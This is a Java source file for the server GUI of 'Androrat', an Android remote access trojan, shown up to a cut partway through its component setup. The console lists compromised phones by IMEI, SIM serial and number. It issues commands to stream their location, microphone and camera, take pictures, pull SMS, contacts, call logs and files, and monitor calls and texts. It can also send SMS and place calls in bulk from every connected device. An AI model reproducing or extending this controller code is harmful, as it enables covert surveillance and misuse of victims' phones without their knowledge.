package gui;

import inout.Protocol;

import java.awt.Color;
import java.awt.Component;
import java.awt.Image;
import java.awt.Toolkit;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane; 
import javax.swing.JTable;
import javax.swing.KeyStroke;
import javax.swing.ListSelectionModel;
import javax.swing.UIManager;

import Packet.AdvancedInformationPacket;
import Packet.CallPacket;
import Packet.PreferencePacket;
import Packet.SMSPacket;

import server.Server;
import utils.Contact;
import utils.EncoderHelper;
import utils.MyFile;
import javax.swing.GroupLayout.Alignment;
import javax.swing.GroupLayout;
import javax.swing.JSplitPane;
import gui.panel.ColorPane;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableCellEditor;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.Dimension;
import java.awt.Font;

/**
 * Diese Klasse ist zum Verwalten und Erstellen der GUI, die zu Begin des Programmes dargestellt wird.
 */
public class GUI extends javax.swing.JFrame {
	
	private JMenuItem buttonRemoveUser;
	private JMenuItem buttonUserGUI;
    private JMenuItem buttonExit;
    private JMenuItem buttonAbout;
    private JMenu jMenu1;
    private JMenu jMenu2;
    private JMenuBar jMenuBar1;
    private JScrollPane jScrollPane1;
    private JScrollPane jScrollPane;
    private JTable userTable;
    private JSplitPane splitPane;

    private UserModel model;
    private HashMap<String, UserGUI> guiMap;
    
    private ColorPane logPanel;
    private Server server;
    private JCheckBoxMenuItem chckbxmntmShowLogs;
    private JMenu mnAbout;
    private JMenu mnBulkActions;
    private JMenuItem mntmToastit;
    private JMenuItem mntmSendSms;
    private JMenuItem mntmGiveCall;
    private JMenuItem mntmPort;

    private boolean downloadComplete = false;

    /**
     * Der Konsturktor der Klasse erstellt die GUI und gibt eine LogNachricht aus.
     * @param server    Der Server
     * @param port  Der Port
     */
    public GUI(Server server, int port) {
    	
    	this.server = server;
    	guiMap = new HashMap<String, UserGUI>();

        initComponents();

        model = new UserModel();
        userTable.setModel(model);
        userTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        userTable.getColumnModel().getColumn(0).setCellRenderer(new MyRenderer());
        logPanel.append(Color.blue, "*** ANDRORAT SERVEUR ***\n" +
        		"Authors : A.Bertrand, A.Akimov, R.David, P.Junk\nLaunch at " +
        		(new Date(System.currentTimeMillis()))+"\n" + 
        		"On port : "+ port +"\n");
        
        centrerTable(userTable);
        
        this.setLocationRelativeTo(null);
        this.setTitle("Androrat Project");
        this.setVisible(true);
    }
    
    
    // *******************************
    //	M�thodes du log gui
    // *******************************

    /**
     * Zum Erstellen von Fehlernachrichten. Diese werden hier dem Panel hinzugeüfgt.
     * @param txt   Der Text
     */
    public void logErrTxt(String txt) {
    	logPanel.append(Color.red, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
    }
    /**
     * Zum Erstellen von Lognachrichten. Diese werden hier dem Panel hinzugefügt.
     * @param txt   Der Text
     */
    public void logTxt(String txt) {
    	logPanel.append(Color.black, (new Date(System.currentTimeMillis())+ " "+txt+"\n"));
    }
    /**
     * Zum Erstellen von Lognachrichten des Clients. Diese werden hier dem Panel hinzugefügt.
     * @param txt   Der Text
     */
    public void clientLogTxt(String imei, long date, String txt) {
    	guiMap.get(imei).logTxt(date, txt);
    	//logPanel.append(Color.gray, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
    }
    /**
     * Zum Erstellen von Fehlernachrichten des Client. Diese werden hier dem Panel hinzugefügt
     * @param txt   Der Text
     */
    public void clientErrLogTxt(String imei, long date, String txt) {
    	guiMap.get(imei).errLogTxt(date, txt);
    	//logPanel.append(Color.red, "Client ("+imei+") at "+(new Date(date))+" : "+txt+"\n");
    }
    

    
    // *******************************
    //	M�thodes des boutons du menu
    // *******************************

    /**
     * Diese Methode wird aufgerufen, wenn der Button Exit gedrückt wird.
     * Hier werden dann die Disconnect Informationen an den Client gesendent, in dem im Portocol die DISCONNECT Flag gesetzt wird.
     */
    private void buttonStartActionPerformed() {
    	try {
	    	for(int row = 0; row < userTable.getRowCount(); row++) {
	    		String imei = (String) model.getValueAt(row, 0);
	    		if(imei != null) server.commandSender(imei, Protocol.DISCONNECT, null);
	    	}
    	} catch(Exception e) {
    		//
    	} finally {
    		this.dispose();
    	}
    }

    /**
     * Diese Methode wird aufgerufen, wenn ein User ausgewählt wurde und Open User Interface gedrückt wird.
     * Danach wird eine neue USERGui erstellt, um genauere Informationen über das Gerät zu erhalten.
     */
    private void buttonUserGUIActionPerformed() {
    	int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	
        	if(imei != null) {
	        	UserGUI gui = guiMap.get(imei);
	        	if(gui == null) {
	        		gui = new UserGUI(imei, this);
	        		guiMap.put(imei, gui);
	        	} else {
	        		gui.setVisible(true);
	        	}
        	}
        	
        } else {
        	JOptionPane.showMessageDialog(this,"No client selected !\nPlease select one client.","No selection",JOptionPane.ERROR_MESSAGE);
        }
    }

    /**
     * Diese Methode wird verwendent, wenn die Schlatfläche Disconnet User gedrückt wird.
     * Sollte dies der Fall sein, wird das Objekt aus der UserTabel zu entfernen und es wird ein Paket mit dem Flag DISCONNECT an den Client gesendet.
     * Zum Schluss wird die deleteUser Methode aufgerufen.
     */
    private void buttonRemoveUserActionPerformed() {
        int row = userTable.getSelectedRow();
        if(row != -1) {
        	String imei = (String) model.getValueAt(row, 1);
        	if(imei != null) {
	        	server.commandSender(imei, Protocol.DISCONNECT, null);
	        	this.deleteUser(imei);
        	}
        } else {
        	JOptionPane.showMessageDialog(this,"No client selected !\nPlease select one client.","No selection",JOptionPane.ERROR_MESSAGE);
        }
    }

    /**
     * Diese Methode wird aufgerufen, wenn die Schlatfläche About Androrat gedrückt wird.
     * Hier wird dann eine DialogBox geöffnet in der die Informationen stehen.
     */
    private void buttonAboutActionPerformed() {
    	JOptionPane.showMessageDialog(this,"Androrat is a free application developped in Java language.\n" +
    			"Autors : A.Bertrand, R.David, A.Akimov & P.Junk\n" +
    			"It is under the GNU GPL3 Licence","About Androrat",JOptionPane.INFORMATION_MESSAGE,
    			new ImageIcon(this.getIconImage()));
    }

    /**
     * Diese Methode wird aufgerufen, wenn die Schaltfläche Show Logs gedrückt wird.
     * Dementsprechend wird das Log Panel entweder versteckt oder angezeigt.
     */
    private void buttonShowLogs() {
    	if(chckbxmntmShowLogs.isSelected()) {
    		logPanel.setVisible(true);
    		jScrollPane.setVisible(true);
    		splitPane.setDividerLocation(0.5);
    	} else {
    		logPanel.setVisible(false);
    		jScrollPane.setVisible(false);
    		splitPane.setDividerLocation(1);
    	}
    }

    
    // *******************************
    //	M�thodes de modif du tableau
    // *******************************

    /**
     * Ajoute une ligne "client" dans le tableau des clients connectés
     * @param imei L'identifiant t�l�phone
     * @param countryCode Le code du pays o� se trouve l'appareil
     * @param telNumber Le numero de t�l�phone (si disponible) de l'appareil
     * @param simCountryCode Le pays d'enregitrement de la SIM
     * @param simSerial Le s�rial de la SIM
     * @param operator L'op�rateur o� se trouve l'appareil
     * @param simOperator L'op�rateur de la carte SIM
     */
    /*
    public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator) {
        if(countryCode == null) countryCode = "/";
        if(telNumber == null) telNumber = "/";
        if(simCountryCode == null) simCountryCode = "/";
        if(simOperator == null) simOperator = "/";
        if(simSerial == null) simSerial = "/";
        if(operator == null) operator = "/";
        model.addUser(new User(imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
    }*/

    /**
     * Diese Methode wird benutzt um einen neuen User zu erstellen und diese zu speichern.
     * @param imei  Die IMEI
     * @param countryCode   Die Länderkennung
     * @param telNumber Die Telefonnummer
     * @param simCountryCode    Die Länderkennung der Simkarte
     * @param simSerial Die Seriennummer der Simkarte
     * @param operator  Der Anbieter
     * @param simOperator   Der Anbieter der Simkarte
     */
    public void addUser(String imei, String countryCode, String telNumber, String simCountryCode, String simSerial, String operator, String simOperator) {
    	
    	if(countryCode == null) countryCode = "/";
        if(telNumber == null) telNumber = "/";
        if(simCountryCode == null) simCountryCode = "/";
        if(simOperator == null) simOperator = "/";
        if(simSerial == null) simSerial = "/";
        if(operator == null) operator = "/";
        
        model.addUser(new User(countryCode,imei, countryCode, telNumber, operator, simCountryCode, simOperator, simSerial));
    }

    /**
     * Diese Klasse ist zum Erstellen und verwenden der Länderflagen vorhanden.
     */
	public class MyRenderer extends DefaultTableCellRenderer
	{
        /**
         * Diese Methode ist zum Anzeigen der Länderflage vorhanden.
         * @param table Die Tabelle
         * @param value Die Länderkennung
         * @param isSelected Diese Varibale wird in der Methdoe nicht verwendet.
         * @param hasFocus Diese Varibale wird in der Methdoe nicht verwendet.
         * @param row   Die Reihe
         * @param column    Die Zeile
         * @return  Das Obejkt
         */
		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column)
		{
			String country = (String) value;
			ImageIcon getImg;
			//country = "fr";
			File f = new File("src/gui/res/Drapeau/" + country.toUpperCase() + ".png");
			if (f.exists())
			{
				getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(
				UserGUI.class.getResource("/gui/res/Drapeau/" + country.toUpperCase() + ".png")));
			} else
			getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/Drapeau/default.jpeg")));

			Image img = getImg.getImage();
			Image newimg = img.getScaledInstance(64, 64, java.awt.Image.SCALE_SMOOTH);
			ImageIcon imgResize = new ImageIcon(newimg);
			setIcon(imgResize);
			return this;
		}
	}
    //-------------------------------------------------

    /**
     * Diese Methode ist zum Entfernen des Clients, welcher durch die IMEI identifiziert wird.
     * Hierzu wird der User entfernt, die Usergui unsichtbar gemacht und gelöscht.
     * @param imei  Die IMEI.
     */
    public void deleteUser(String imei) {
        model.removeUser(imei);
        UserGUI gui = guiMap.get(imei);
        if(gui != null) {
	        if(gui.isVisible()) gui.launchMessageDialog("This client is no longer available.\nClosing frame now ...", "Disconnection", JOptionPane.ERROR_MESSAGE);
	        gui.dispose();
        }
        guiMap.remove(imei);
        getContentPane().repaint();
    }

    /**
     * Diese Methode ist zum Schließen der UserGui des Geräts mit der IMEI. Um dies zu tun, wird die GUI aus der GuiMap entfernt.
     * @param imei Die IMEI
     */
    public void closeUserGUI(String imei) {
    	guiMap.remove(imei);
    }
    
    
    // *******************************
    //	M�thodes de modif des userGUI
    // *******************************

    /**
     * Diese Methode erhält die IMEI und ein AdvancedInformationPacket und ruft damit die Updatemethode der entsprechenden UserGui auf (HomeTab).
     * @param imei die Imei
     * @param packet    Das Paket
     */
    public void updateAdvInformations(String imei, AdvancedInformationPacket packet) {
    	UserGUI user = guiMap.get(imei);
    	user.updateHomeInformations(packet);
    }

    /**
     * Erhält die Datena und gibt sie an die entsprechende UserGui und das richtige Anzeigetab weiter.
     * Zum Updaten der Informationen
     * @param imei  Die IMEI
     * @param ip    DIe Ip
     * @param port  Der Port
     * @param wait  wait
     * @param phones    Die Telefonnummern
     * @param sms   Die SMSnummern
     * @param kw    Die Schlüsselwortliste
     */
    public void updatePreference(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
    	UserGUI user = guiMap.get(imei);
    	user.updatePreference(ip, port, wait, phones, sms, kw);
    }

    /**
     * Diese Methode ist zum Updaten der GPS Koordinaten. Hierzu wird die richtie UserGui mit Hilfe der IMEI ausgesucht und dann die update Methode des MapTabs aufgerufen.
     * @param imei  Die IMEI
     * @param lon   Längenrgrad
     * @param lat   Breitengrad
     * @param alt   Die Höhe
     * @param speed Die Geschwindigkeit
     * @param accuracy  Die Genauigkeit
     */
    public void updateUserMap(String imei, double lon, double lat, double alt, float speed, float accuracy) {
    	UserGUI user = guiMap.get(imei);
    	user.updateMap(lon, lat, alt, speed, accuracy);
    }

    /**
     * Diese Methode ist zum Updaten des Bilds. Dazu wird die richtige UserGUi ausgesucht und für deren Tab dann die update Methode aufgerufen.
     * @param imei  Die Imei
     * @param picture   Das Bild
     */
    public void updateUserPicture(String imei, byte[] picture) {
    	UserGUI user = guiMap.get(imei);
    	user.updatePicture(picture);
    }

    /**
     * Diese Methode ist zum Aktualisieren des Soundtabs vorhanden. Hier werden dann die neuen Daten abgespielt.
     * Dazu wird die richtige UserGui per IMEI Idetifiziert und die addSoundBytes Methode aufgerufen.
     * @param imei  Die IMEI
     * @param data  Die Daten
     */
    public void addSoungBytes(String imei, byte[] data) {
    	UserGUI user = guiMap.get(imei);
    	user.addSoundBytes(data);
    }

    /**
     * Diese Methode ist zum Weiterleiten der neuen Videodaten an die richtige UserGui.
     * @param imei  Die IMEI
     * @param data  Die Videodaten
     */
    public void addVideoBytes(String imei, byte[] data) {
    	UserGUI user = guiMap.get(imei);
    	user.addVideoBytes(data);
    }

    /**
     * Diese Methode ist zum Aktualisieren der Daten des FileTreeTabs.
     * Es wird die entsprechende UserGui ausgesucht und dann die Updatemethode des Panels aufgerufen.
     * @param imei  Die IMEI
     * @param fileList  Die Ordnerstruktur
     */
    public void updateFileTree(String imei, ArrayList<MyFile> fileList) {
    	UserGUI user = guiMap.get(imei);
    	user.updateFileTree(fileList);
    }

    /**
     * Diese Methode ist zum Updaten der Anruflisten vorhanden. Hierzu wird die UserGui ausgewählt und dann die UpdateMethode des CallLog Panels aufgerufen.
     * @param imei  Die IMEI
     * @param logsList  Die Anrufliste
     */
    public void updateUserCallLogs(String imei, ArrayList<CallPacket> logsList) {
    	UserGUI user = guiMap.get(imei);
    	user.updateCallLogs(logsList);
    }

    /**
     * Diese Methode ist zum Aktualisieren der Kontaktdaten.
     * Es wird dann die UserGUI mit der IMEI herausgesucht und die Updatemethode des entsprechendn Tabs aufgerufen.
     * @param imei  Die IMEI
     * @param contacts  Die Kontakte
     */
    public void updateContacts(String imei, ArrayList<Contact> contacts) {
    	UserGUI user = guiMap.get(imei);
    	user.updateContacts(contacts);
    }

    /**
     * Diese Methode ist zum Hinzufügen eine neuen Anrufs vorhanden. Damit dies in der richtige UserGui geschieht, wird diese mit der IMEI idetifiziert und die Updatemethode des entsprechenden Tabs aufgerufen.
     * @param imei  Die IMEI
     * @param type  Die Art des Anrufs
     * @param phoneNumber   Die Telefonnummer
     */
    public void addMonitoredCall(String imei, int type, String phoneNumber) {
    	UserGUI user = guiMap.get(imei);
    	user.addMonitoredCall(type, phoneNumber);
    }

    /**
     * Diese Methode ist zum Hinzufügen einer neu empfangenen SMS vorhanden. Hierzu wird die UserGui per IMEI ausgewählt und die Updatemethode aufgerufen.
     * @param imei  Die IMEI
     * @param addr  Die Telefonnummern
     * @param date  Das Datum
     * @param body  Die Nachricht.
     */
    public void addMonitoredSMS(String imei, String addr, long date, String body) {
    	UserGUI user = guiMap.get(imei);
    	user.addMonitoredSMS(addr, date, body);
    }

    /**
     * Zum Aktualisieren der SMSListe. Hierzu wird die UserGui per IMEI ausgewählt und die Updatemethode aufgerufen.
     * @param imei  Die IMEI
     * @param sms   Die SMSListe
     */
    public void updateSMS(String imei, ArrayList<SMSPacket> sms) {
    	UserGUI user = guiMap.get(imei);
    	user.updateSMS(sms);
    }
    
    
    // *******************************
    //	M�thodes pour save le channel
    // *******************************

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die GPSDaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveMapChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMapChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveCallLogChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveCallLogChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Kontaktdaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveContactChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveContactChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Smsmonitordaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveMonitorSMSChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMonitorSMSChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Anruflistendaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveMonitorCallChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveMonitorCallChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Bilddaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void savePictureChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.savePictureChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Audiodaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveSoundChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveSoundChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die Videodaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveVideoChannel(String imei, int channel) {
    	UserGUI user = guiMap.get(imei);
    	user.saveVideoChannel(channel);
    }

    /**
     * Diese Methode ist zum Speichern des Datenkanals für die SMSDaten. Die UserGui wird per IMEI ausgewählt.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void saveSMSChannel(String imei, int channel) {
    	// TODO
    }
    
    
    // *******************************
    //	M�thodes pour les UserGUI
    // *******************************

    /**
     * Diese Methode ist zum Senden der Anfrage, um die Advanced Informations und die Einstellungen zu erhalten.
     * @param imei  Die IMEI
     */
    public void fireGetAdvInformations(String imei) {
    	server.commandSender(imei, Protocol.GET_ADV_INFORMATIONS, null);
    	server.commandSender(imei, Protocol.GET_PREFERENCE, null);
    }

    /**
     * Die Methode ist zum Senden der Anfrage, um die SMS zu erhalten. Der String req sind die Filter nach denen die SMSListe gefiltert werden soll.
     * @param imei  Die IMEI
     * @param req   Die Filter
     */
    public void fireGetSMS(String imei, String req) {
    	server.commandSender(imei, Protocol.GET_SMS, req.getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den GPS Stream zu aktivieren.
     * @param imei  Die IMEI
     * @param provider  Der Provider des Quelle
     */
    public void fireStartGPSStreaming(String imei, String provider) {
    	server.commandSender(imei, Protocol.GET_GPS_STREAM, provider.getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den GPS Stream zu stoppen.
     * @param imei  Die IMEI
     * @param channel   Der Kanal
     */
    public void fireStopGPSStreaming(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_GPS_STREAM, null, channel);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den Sound Stream zu aktivieren.
     * @param imei  Die IMEI
     * @param source    Die Quelle des Sounds
     */
    public void fireStartSoundStreaming(String imei, int source) {
    	byte[] byteSource = ByteBuffer.allocate(4).putInt(source).array();
    	server.commandSender(imei, Protocol.GET_SOUND_STREAM, byteSource);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den Sound Stream zu stoppen.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void fireStopSoundStreaming(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_SOUND_STREAM, null, channel);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den Video Stream zu aktivieren.
     * @param imei  Die IMEI
     */
    public void fireStartVideoStream(String imei, byte[] cam) {
    	server.commandSender(imei, Protocol.GET_VIDEO_STREAM, cam);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den Video Stream zu stoppen.
     * @param imei  Die IMEI
     * @param channel   Der Kanal
     */
    public void fireStopVideoStream(String imei, int channel) {
        server.commandStopSender(imei, Protocol.STOP_VIDEO_STREAM, null, channel);

    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um ein Bild aufzunehmen.
     * @param imei Die IMEI
     */
    public void fireTakePicture(String imei,String cam) {
        byte[] camera = new byte[1];
        if(cam == "Back camera"){
            camera[0] = 0;
        }

        else{
            camera[0] = 1;
        }
        server.commandSender(imei, Protocol.GET_PICTURE, camera);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um einen Ordner herunterzuladen.
     * @param imei  Die IMEI
     * @param path  Der Pfad
     * @param downPath  Der Downpfad
     * @param downName  Der Name
     */
    public void fireFileDownload(String imei, String path, String downPath, String downName) {
    	server.commandFileSender(imei, Protocol.GET_FILE, path.getBytes(), downPath, downName);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um die Ordnerstruktur zu erhalten.
     * @param imei  Die IMEI
     */
    public void fireTreeFile(String imei) {
    	server.commandSender(imei, Protocol.LIST_DIR, "/".getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um ein Toast abzusetzen.
     * @param imei  Die IMEI
     * @param txt   Der Text des Toasts
     */
    public void fireToastMessage(String imei, String txt) {
    	server.commandSender(imei, Protocol.DO_TOAST, txt.getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um das Gerät eine bestimmte Zeit vibrieren zu lassen.
     * @param imei  Die IMEI
     * @param duration  Die Dauer in Millisekunden
     */
    public void fireVibrate(String imei, Long duration) {
    	server.commandSender(imei, Protocol.DO_VIBRATE, EncoderHelper.encodeLong(duration));
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um eine bestimmte Webseite auf dem Gerät zu öffnen.
     * @param imei  Die IMEI
     * @param url   Die Url der Webseite
     */
    public void fireBrowseUrl(String imei, String url) {
    	server.commandSender(imei, Protocol.OPEN_BROWSER, url.getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um eine SMS zu senden.
     * @param imei  DIe IMEI
     * @param map   Die Sms Daten
     */
    public void fireSendSMS(String imei, HashMap<String, String> map) {
    	byte[] data = EncoderHelper.encodeHashMap(map);
    	server.commandSender(imei, Protocol.SEND_SMS, data);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um eine Anruf auf dem Gerät abzusetzen.
     * @param imei  Die IMEI
     * @param target    Die Telefonnummer
     */
    public void fireGiveCall(String imei, String target) {
    	server.commandSender(imei, Protocol.GIVE_CALL, target.getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um die Anrufliste zu erhalten.
     * @param imei  Die IMEI
     * @param request   Die Filter für die Liste.
     */
    public void fireCallLogs(String imei, String request) {
    	server.commandSender(imei, Protocol.GET_CALL_LOGS, request.getBytes());
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um die Kontakte zu erhalten.
     * @param imei  Die IMEI
     */
    public void fireContacts(String imei) {
    	server.commandSender(imei, Protocol.GET_CONTACTS, null);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage ,um das Monitoren von Anrufen zu starten.
     * @param imei  Die IMEI
     * @param phoneNumbers  Die Telefonnummern nachdenen gefiltert werden soll.
     */
    public void fireStartCallMonitoring(String imei, HashSet<String> phoneNumbers) {
    	server.commandSender(imei, Protocol.MONITOR_CALL, EncoderHelper.encodeHashSet(phoneNumbers));
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um das Monitoren von Anrufen zu stoppen.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void fireStopCallMonitoring(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_MONITOR_CALL, null, channel);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um das Monitoren von SMS zu starten.
     * @param imei  Die IMEI
     * @param phoneNumbers  Die Telefonnummern nach denen gefiltert wird.
     */
    public void fireStartSMSMonitoring(String imei, HashSet<String> phoneNumbers) {
    	server.commandSender(imei, Protocol.MONITOR_SMS, EncoderHelper.encodeHashSet(phoneNumbers));
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um das Monitoren von SMS zu stoppen.
     * @param imei  Die IMEI
     * @param channel   Der Datenkanal
     */
    public void fireStopSMSMonitoring(String imei, int channel) {
    	server.commandStopSender(imei, Protocol.STOP_MONITOR_SMS, null, channel);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um das Blitzlich zu aktivieren.
     * @param imei  Die IMEI
     */
    public void fireTorchOn(String imei){
        server.commandSender(imei, Protocol.TORCH,null);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um das Blitzlicht zu deaktivieren.
     * @param imei Die IMEI
     */
    public void fireTorchOff(String imei){
        server.commandSender(imei,Protocol.STOP_TORCH,null);
    }

    /**
     * Diese Methode ist zum Senden der Anfrage, um den Alarm zu erstellen.
     * @param imei Die IMEI
     * @param args  Die Uhrzeit.
     */
    public void fireAlarm(String imei, byte[] args){ server.commandSender(imei, Protocol.SET_ALARM, args);}
    /**
     * Diese Methode ist zum Senden der Anfrage, um die Konfiguration zu speichern.
     * @param imei  Die IMEI
     * @param ip    Die IP
     * @param port  Der Port
     * @param wait  wait
     * @param phones    Die Telefonliste
     * @param sms   Die SMSnummernliste
     * @param kw    Die Schlüsselwortliste
     */
    public void fireSaveConnectConfiguration(String imei, String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
    	PreferencePacket pp = new PreferencePacket(ip, port, wait, phones, sms, kw);
    	server.commandSender(imei, Protocol.SET_PREFERENCE, pp.build());
    }


    /**
     * Diese Methode ist zum Absetzen eines Toasts zuständig. Hier wird der Dialog erstellt und die eingelesenen Daten im Anschluss per FireToastMessage abgesendet.
     */
    private void fireBulkToast() {
    	String txt = JOptionPane.showInputDialog(this, "Enter your text :");
    	if(txt != null) {
    		for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireToastMessage(imei, txt);
    		}
    	}
    }

    /**
     * Diese Methode ist zum Senden einer SMS. Hier wird der SMSdialog gestartet und im Anschluss wird die Anfrage eine SMS zuversenden abgesetzt.
     */
    private void fireBulkSMS() {
    	SMSDialog dialog = new SMSDialog(this);
		String[] res = dialog.showDialog();
		if(res != null) {
			HashMap<String, String> map = new HashMap<String, String>();
			map.put(Protocol.KEY_SEND_SMS_NUMBER, res[0]);
			map.put(Protocol.KEY_SEND_SMS_BODY, res[1]);
			
			for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireSendSMS(imei, map);
    		}
		}
    }

    /**
     * Diese Methode ist zum Absetzen eines Anrufs. Hierzu wird ein Dialog erstellt. Die eingegebenen Daten werden dann an das Gerät weitergeleitet.
     */
    private void fireBulkCall() {
    	String target = JOptionPane.showInputDialog(this, "Enter the target cell number :");
    	if(target != null) {
    		for(int row = 0; row < userTable.getRowCount(); row++) {
    			String imei = (String) model.getValueAt(row, 1);
    			if(imei != null) this.fireGiveCall(imei, target);
    		}
    	}
    }
    /**
     * Diese Methode ist zum Einstellen des Ports auf dem der Server lauscht.
     */
    private void fireSelectPort() {
    	String rep = JOptionPane.showInputDialog(this, "Enter the new server port (need server reboot) : ");
    	server.savePortConfig(rep);
    }

    /**
     * Diese Methode ist zum Erkennen, ob und wo geklickt wurde.
     * @param e Das Event
     */
    private void userMouseClicked(MouseEvent e) {
    	if(e.getClickCount() == 2) {
	    	this.buttonUserGUIActionPerformed();
    	}
    }


    /**
     * Diese Funtkion ist zum Erstellen der GUI. Hier werden die unterschiedlichen Schaltflächen erstellt und positioniert.
     */
    private void initComponents() {
    	
    	try {
    		UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }

    	BufferedImage image = null;
        try {
            image = ImageIO.read(
                this.getClass().getResource("/gui/res/androrat_logo_32pix.png"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        this.setIconImage(image);
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        buttonExit = new javax.swing.JMenuItem();
        jMenu2 = new javax.swing.JMenu();
        buttonRemoveUser = new javax.swing.JMenuItem();
        buttonUserGUI = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jMenu1.setText("Server");

        buttonExit.setText("Exit application");
        buttonExit.addActionListener(new java.awt.event.ActionListener() {
            @Override
			public void actionPerformed(java.awt.event.ActionEvent evt) {
                buttonStartActionPerformed();
            }
        });
